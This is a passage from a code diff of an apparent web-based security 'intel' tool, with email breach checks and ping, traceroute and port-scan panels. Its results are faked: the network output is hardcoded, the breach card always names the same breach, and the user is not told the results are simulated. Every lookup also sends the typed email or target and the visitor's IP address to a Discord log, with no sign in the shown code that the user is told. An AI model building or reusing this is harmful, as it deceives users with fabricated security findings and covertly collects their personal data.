+                                            ${emailData.breaches}
+                                        </span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <th>Reputation</th>
+                                    <td>
+                                        <span class="badge ${emailData.reputation.score > 70 ? 'bg-success' : emailData.reputation.score > 40 ? 'bg-warning' : 'bg-danger'}">
+                                            ${emailData.reputation.score}/100
+                                        </span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <th>Spam Risk</th>
+                                    <td>
+                                        <span class="badge ${emailData.reputation.spam ? 'bg-danger' : 'bg-success'}">
+                                            ${emailData.reputation.spam ? 'High' : 'Low'}
+                                        </span>
+                                    </td>
+                                </tr>
+                            </table>
+                        </div>
+                    </div>
+                </div>
             </div>
-        `;
-    }
-});
-
-// Email Intel Functionality
-document.getElementById('emailIntelForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const email = document.getElementById('intelEmail').value.trim();
-    const resultsDiv = document.getElementById('emailIntelResult');
-    
-    resultsDiv.innerHTML = `
-        <div class="card p-3">
-            <div class="d-flex justify-content-center">
-                <div class="loading-spinner"></div>
-                <span class="ms-2">Analyzing email...</span>
+            
+            ${emailData.breaches > 0 ? `
+            <div class="card mt-4">
+                <div class="card-body">
+                    <h5><i class="fas fa-exclamation-triangle me-2 text-danger"></i>Breach Details</h5>
+                    <div class="alert alert-danger mt-3">
+                        <i class="fas fa-exclamation-circle me-2"></i>
+                        This email appears in ${emailData.breaches} known data breaches
+                    </div>
+                    
+                    <div class="breach-card mt-3">
+                        <div class="breach-header">
+                            <i class="fas fa-database me-2"></i>
+                            <h5 class="breach-title mb-0">LinkedIn 2021 Breach</h5>
+                            <span class="badge bg-danger ms-2">High</span>
+                        </div>
+                        <div class="p-3">
+                            <p><strong>Date:</strong> June 2021</p>
+                            <p><strong>Compromised Data:</strong> Emails, Passwords</p>
+                            <p><strong>Records:</strong> 700 million</p>
+                        </div>
+                    </div>
+                </div>
             </div>
+            ` : ''}
         </div>
     `;
     
-    try {
-        // Simulate API call with timeout
-        setTimeout(() => {
-            const domain = email.split('@')[1];
-            const disposableDomains = ["mailinator.com", "tempmail.com", "10minutemail.com"];
-            const isDisposable = disposableDomains.includes(domain);
-            
-            let resultHTML = `
-                <div class="card p-3">
-                    <h5>Email Analysis</h5>
-                    <p><strong>Email:</strong> ${email}</p>
-                    <p><strong>Domain:</strong> ${domain}</p>
-                    
-                    <div class="mt-3 p-3 rounded ${isDisposable ? 'bg-danger' : 'bg-success'}">
-                        ${isDisposable ? 
-                            `<i class="fas fa-exclamation-triangle me-2"></i>Disposable email detected` : 
-                            `<i class="fas fa-check-circle me-2"></i>Valid email provider`
-                        }
-                    </div>
-                    
-                    <div class="mt-3">
-                        <h6><i class="fas fa-shield-alt me-2"></i>Reputation Analysis</h6>
-                        <div class="p-3 bg-dark rounded mt-2">
-                            <p><strong>Spam Score:</strong> ${Math.floor(Math.random() * 100)}/100</p>
-                            <p><strong>Breach Status:</strong> ${Math.random() > 0.7 ? "Compromised" : "Not found"}</p>
-                        </div>
-                    </div>
-                </div>
-            `;
-            
-            resultsDiv.innerHTML = resultHTML;
-            
-            // Log to Discord
-            logToDiscord(
-                "Email Analysis", 
-                `Analyzed email: ${email}`,
-                [
-                    { name: "Disposable", value: isDisposable ? "Yes" : "No" },
-                    { name: "Domain", value: domain }
-                ]
-            );
-            
-        }, 1500);
-    } catch (error) {
-        resultsDiv.innerHTML = `
-            <div class="card p-3 text-danger">
-                <i class="fas fa-exclamation-circle me-2"></i>Error analyzing email
+    resultsDiv.innerHTML = resultHTML;
+    
+    // Log to Discord
+    logToDiscord(
+        "Email Analysis", 
+        `Analyzed email: ${email}`,
+        [
+            { name: "Domain", value: domain },
+            { name: "Disposable", value: emailData.disposable ? "Yes" : "No" },
+            { name: "Breaches", value: emailData.breaches.toString() },
+            { name: "Visitor IP", value: visitorIP }
+        ]
+    );
+}
+
+// Network Tools Handler
+function handleNetworkTool() {
+    const target = document.getElementById('networkTarget').value.trim() || "example.com";
+    const tool = document.getElementById('networkTool').value || "ping";
+    const resultsDiv = document.getElementById('networkResults');
+    
+    // Simulated network data
+    const pingResults = [
+        { seq: 1, time: 24, ttl: 54 },
+        { seq: 2, time: 22, ttl: 54 },
+        { seq: 3, time: 25, ttl: 54 },
+        { seq: 4, time: 23, ttl: 54 }
+    ];
+    
+    const tracerouteResults = [
+        { hop: 1, ip: "192.168.1.1", time: 1.2 },
+        { hop: 2, ip: "10.10.10.1", time: 5.4 },
+        { hop: 3, ip: "45.33.112.1", time: 12.8 },
+        { hop: 4, ip: "64.233.177.1", time: 18.2 }
+    ];
+    
+    const portscanResults = [
+        { port: 22, service: "SSH", status: "open" },
+        { port: 80, service: "HTTP", status: "open" },
+        { port: 443, service: "HTTPS", status: "open" },
+        { port: 3389, service: "RDP", status: "filtered" }
+    ];
+    
+    let resultHTML = '<div class="card p-3">';
+    resultHTML += `<h4><i class="fas fa-network-wired me-2"></i>${tool.charAt(0).toUpperCase() + tool.slice(1)} Results for ${target}</h4>`;
+    
+    if (tool === "ping") {
+        resultHTML += `
+            <div class="mt-3">
+                <pre>PING ${target} (93.184.216.34): 56 data bytes</pre>
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Seq</th>
+                            <th>Time (ms)</th>
+                            <th>TTL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${pingResults.map(ping => `
+                            <tr>
+                                <td>${ping.seq}</td>
+                                <td>${ping.time}</td>
+                                <td>${ping.ttl}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+                <pre class="mt-2">
+--- ${target} ping statistics ---
+4 packets transmitted, 4 packets received, 0.0% packet loss
+round-trip min/avg/max = 22/23.5/25 ms</pre>
+            </div>
+        `;
+    } else if (tool === "traceroute") {
+        resultHTML += `
+            <div class="mt-3">
+                <pre>traceroute to ${target} (93.184.216.34), 30 hops max</pre>
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Hop</th>
+                            <th>IP</th>
+                            <th>Time (ms)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${tracerouteResults.map(hop => `
+                            <tr>
+                                <td>${hop.hop}</td>
+                                <td>${hop.ip}</td>
+                                <td>${hop.time}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            </div>
+        `;
+    } else if (tool === "portscan") {
+        resultHTML += `
+            <div class="mt-3">
+                <pre>Starting Nmap scan for ${target} (93.184.216.34)</pre>
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Port</th>
+                            <th>Service</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${portscanResults.map(port => `
+                            <tr>
+                                <td>${port.port}</td>
+                                <td>${port.service}</td>
+                                <td><span class="badge ${port.status === 'open' ? 'bg-success' : 'bg-warning'}">${port.status}</span></td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+                <pre class="mt-2">
+Nmap done: 1 IP address scanned in 2.45 seconds</pre>
             </div>
         `;
     }
-});
+    
+    resultHTML += '</div>';
+    resultsDiv.innerHTML = resultHTML;
+    
+    // Log to Discord
+    logToDiscord(
+        "Network Tool Used", 
+        `Ran ${tool} on ${target}`,
+        [
+            { name: "Tool", value: tool },
+            { name: "Target", value: target },
+            { name: "Visitor IP", value: visitorIP }
+        ]
+    );
+}
 </script>
 </body>
 </html>
